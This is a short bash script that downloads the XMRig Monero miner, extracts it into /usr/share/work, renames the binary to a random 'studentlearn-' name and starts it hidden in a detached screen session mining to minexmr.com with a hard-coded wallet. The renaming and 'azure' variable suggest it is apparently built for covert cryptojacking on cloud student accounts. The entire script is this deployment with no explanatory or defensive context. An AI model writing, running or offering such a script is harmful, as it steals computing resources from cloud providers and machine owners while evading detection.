#!/bin/bash
sudo apt-get update
azure=studentlearn
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-6.14.1
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz 
mv xmrig-6.14.1-linux-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf xmrig-6.14.1-linux-x64.tar.gz
rm -rf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1
a='studentlearn-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
mv xmrig $azure -n
sudo cp $azure "$cpuname"
sudo rm -f  xmrig
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" -o pool.minexmr.com:6666 -u 83RBenv44USZpppATtxX3LHrZqstpuTpcfuT4FEMH35uMfoWWnbMtLMfAit3bTV4HEWYoCqcNH7ZTU3VoAsayUaDEbcRUo9 -p anitaosbeck
